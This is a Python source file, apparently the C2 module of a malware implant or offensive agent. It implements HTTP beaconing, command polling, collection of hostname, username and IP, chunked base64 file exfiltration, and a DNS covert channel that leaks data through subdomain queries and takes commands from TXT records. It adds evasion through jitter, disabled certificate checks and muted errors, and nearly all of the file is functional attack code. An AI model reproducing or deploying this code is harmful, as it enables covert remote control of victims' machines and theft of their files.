# Enhanced C2 Communication Module
# Implements secure, stealthy command and control communications

import requests
import json
import time
import random
import base64
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from config import (
    C2_SERVER, C2_USER_AGENT, C2_TIMEOUT, C2_MAX_RETRIES,
    RETRY_DELAY_MIN, RETRY_DELAY_MAX, DEBUG_MODE, AGENT_API_KEY
)
from core.stealth import stealth_manager

# Disable SSL warnings for stealth operations
urllib3.disable_warnings(InsecureRequestWarning)

class SecureC2Client:
    
    def __init__(self, server_url=None, user_agent=None, session_id=None):
        self.server_url = server_url or C2_SERVER
        self.user_agent = user_agent or C2_USER_AGENT
        self.session_id = session_id or self._generate_session_id()
        self.session = self._create_session()
        
    def _generate_session_id(self):
        """Generate a unique session ID for this agent instance"""
        import hashlib
        import uuid
        
        key_material = f"{uuid.getnode()}{time.time()}{random.random()}"
        return hashlib.md5(key_material.encode()).hexdigest()[:16]
        
    def _create_session(self):
        session = requests.Session()
        
        session.verify = False
        
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Agent-Key': AGENT_API_KEY
        })
        
        return session
    
    def send_data(self, data, endpoint="/data"):
        """Send data to C2 server in the format expected by the API"""
        # Add session_id to payload
        if isinstance(data, dict):
            payload = {**data, 'sessionId': self.session_id}
        else:
            payload = {'sessionId': self.session_id, 'data': data}
        
        for attempt in range(C2_MAX_RETRIES):
            try:
                # Jitter
                stealth_manager.add_jitter()
                
                response = self.session.post(
                    f"{self.server_url}{endpoint}",
                    json=payload,
                    timeout=C2_TIMEOUT
                )
                
                if response.status_code == 200:
                    return response.json()
                elif response.status_code == 401:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"C2 authentication failed")
                        )
                    return False
                    
            except requests.exceptions.RequestException as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"C2 communication attempt {attempt + 1} failed: {e}")
                    )
                
                if attempt < C2_MAX_RETRIES - 1:
                    delay = random.uniform(
                        RETRY_DELAY_MIN * (2 ** attempt),
                        RETRY_DELAY_MAX * (2 ** attempt)
                    )
                    time.sleep(delay)
        
        return False
    
    def receive_commands(self, endpoint="/commands"):
        """Poll for pending commands from C2 server"""
        try:
            stealth_manager.add_jitter()
            
            # Pass session_id as query param
            params = {'sessionId': self.session_id}
            
            response = self.session.get(
                f"{self.server_url}{endpoint}",
                params=params,
                timeout=C2_TIMEOUT
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and data.get('data'):
                    commands = data['data'].get('commands', [])
                    return commands
            elif response.status_code == 401:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"Command retrieval auth failed")
                    )
        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command retrieval failed: {e}")
                )
        
        return []
    
    def heartbeat(self, system_info=None):
        """Send heartbeat to C2 server"""
        heartbeat_data = {
            'hostname': system_info.get('hostname') if system_info else None,
            'username': system_info.get('username') if system_info else None,
            'ipAddress': system_info.get('ipAddress') if system_info else None,
            'operatingSystem': system_info.get('operatingSystem') if system_info else None,
            'architecture': system_info.get('architecture') if system_info else None,
            'metadata': system_info
        }
        
        return self.send_data(heartbeat_data, endpoint="/heartbeat")
    
    def exfiltrate_file(self, file_path, chunk_size=1024*1024):
        try:
            import os
            
            if not os.path.exists(file_path):
                return False
            
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            metadata = {
                'type': 'file_start',
                'filename': file_name,
                'size': file_size,
                'chunks': (file_size // chunk_size) + 1
            }
            
            if not self.send_data(metadata, endpoint="/upload"):
                return False
            
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    chunk_data = {
                        'type': 'file_chunk',
                        'filename': file_name,
                        'chunk_num': chunk_num,
                        'data': base64.b64encode(chunk).decode()
                    }
                    
                    if not self.send_data(chunk_data, endpoint="/upload"):
                        return False
                    
                    chunk_num += 1
                    
                    # Add delay between chunks
                    stealth_manager.add_jitter(0.1, 1)
            
            # Send completion signal
            completion = {
                'type': 'file_complete',
                'filename': file_name
            }
            
            return self.send_data(completion, endpoint="/upload")
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"File exfiltration failed: {e}")
                )
            return False

class DNSC2Client:
    """DNS-based C2 communication for covert channels"""
    
    def __init__(self, domain="example.com"):
        self.domain = domain
        try:
            import dns.resolver
            self.resolver = dns.resolver.Resolver()
        except ImportError:
            self.resolver = None
    
    def send_data_dns(self, data):
        if not self.resolver:
            return False
            
        try:
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{i}.{chunk}.{self.domain}"
                try:
                    self.resolver.resolve(subdomain, 'TXT')
                except:
                    pass  # Expected to fail, we're just sending data
                
                stealth_manager.add_jitter(0.1, 0.5)
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"DNS C2 send failed: {e}")
                )
            return False
    
    def receive_commands_dns(self):
        if not self.resolver:
            return None
            
        try:
            command_domain = f"cmd.{self.domain}"
            answers = self.resolver.resolve(command_domain, 'TXT')
            
            for answer in answers:
                command_data = answer.to_text().strip('"')
                decoded_command = base64.b64decode(command_data).decode()
                return json.loads(decoded_command)
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"DNS C2 receive failed: {e}")
                )
        
        return None

c2_client = SecureC2Client()
dns_c2_client = DNSC2Client()